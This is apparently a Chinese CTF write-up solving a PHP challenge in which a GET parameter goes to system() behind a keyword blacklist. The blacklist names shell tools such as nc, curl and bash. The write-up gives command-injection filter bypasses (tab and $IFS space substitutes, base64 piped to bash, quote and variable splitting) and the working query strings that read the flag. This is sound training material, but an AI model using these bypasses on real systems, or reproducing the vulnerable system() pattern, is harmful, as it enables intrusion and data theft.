访问网址显示内容如下:

![1623846741_60c9ef55e9e797b6649a4.png!small?1623846740109](https://image.3001.net/images/20210616/1623846741_60c9ef55e9e797b6649a4.png!small?1623846740109)

## 代码分析：

    
    
     **<?php
    highlight_file(__FILE__); //对文件进行语法高亮显示
    $filter = '/#|`| |[\x0a]|php|perl|dir|rm|ls|sleep|cut|sh|bash|grep|ash|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\{|\}|\>|\<|\?|\'|"|\*|;|\||&|\/|\\\\/is'; #定义黑名单
    $cmd = $_GET['cmd']; # get方式传递数据
    if(!preg_match($filter, $cmd)){ # 正则匹配并判断传递的数据
        system($cmd."echo 'okkkkkk'"); #执行外部程序，并显示输出
    }else{
        die("ohhhhnnnoooooooooo....."); #输出一条消息，并退出当前脚本。
    }
    ?>**

## 解题思路

首先分析代码, 一开始先定义了一个 **filter** 过滤了一些bash命令等关键字（这里过滤了大多数常见的命令、符号等），定义了一个
**$_GET变量** 用于接收来自GET方法的数据，经过匹配 **filter** 后，如果没有相关关键字则将用户GET传的数据拼接 **echo
'okkkkkk'** 后执行 **system(）** 函数，如果匹配到相关字眼就输出 **ohhhhnnnoooooooooo.....**
并退出，所以整道题的核心就是 **绕过filter** 。

##  **黑名单绕过**

 **空格绕过 %09 $IFS$9 ${IFS} %0c %0b < 禁用ls dir du / du -a . 禁用cat nl more tac
tail head less
<https://www.cnblogs.com/emilyyoucan/p/8664097.html>![1623848568_60c9f6781dae989b735a7.png!small?1623848566213](https://image.3001.net/images/20210616/1623848568_60c9f6781dae989b735a7.png!small?1623848566213)grep
f /flag {awk,’/f/’,flag}(看环境不一定都适用） ca\t echo "bHM="|base64 -d|bash `echo
"bHM="|base64 -d` ftm flag file -f flag sed p flag sort flag 若禁用system函数
可用echo('ls /'); 若知道flag的文件可用include函数配合文件包含漏洞进行攻击 函数利用
var_dump(),scandir(),highlight_file(),show_source() 若过滤关键字 linux 通配符*,?[a-z]
![1623848817_60c9f7716c7fad2b7e997.png!small?1623848815666](https://image.3001.net/images/20210616/1623848817_60c9f7716c7fad2b7e997.png!small?1623848815666)字符拼接
fl''ag fl'a'g 用变量拼接 a=c;b=at;c=fl;d=ag;$a$b $c$d**

##  **本题考点**

>  **① 空格绕过**
>
>  **②查看列目录文件命令**
>
>  **③ 查看文件命令**

## 解题步骤

>  **经测试：**
>
>  **①绕过空格 %09**
>
>  **②列目录命令 du -a . 或chgrp -v -R**
>
>  **③ 查看文件 sed p**

 **查看文件名：**

>  **1）?cmd=du%09-a%09.%09**
>
>  **2）?cmd=chgrp%09-v%09-R%09root%09.%09**

![1623850342_60c9fd66122750d1da5de.png!small?1623850340259](https://image.3001.net/images/20210616/1623850342_60c9fd66122750d1da5de.png!small?1623850340259)

![1623850396_60c9fd9c49f1d5541a795.png!small?1623850394306](https://image.3001.net/images/20210616/1623850396_60c9fd9c49f1d5541a795.png!small?1623850394306)

 **查看文件：**

>  **?cmd=sed%09p%09f1ag_1s_here%09  
> **

![1623849748_60c9fb140e043dc74f260.png!small?1623849746035](https://image.3001.net/images/20210616/1623849748_60c9fb140e043dc74f260.png!small?1623849746035)

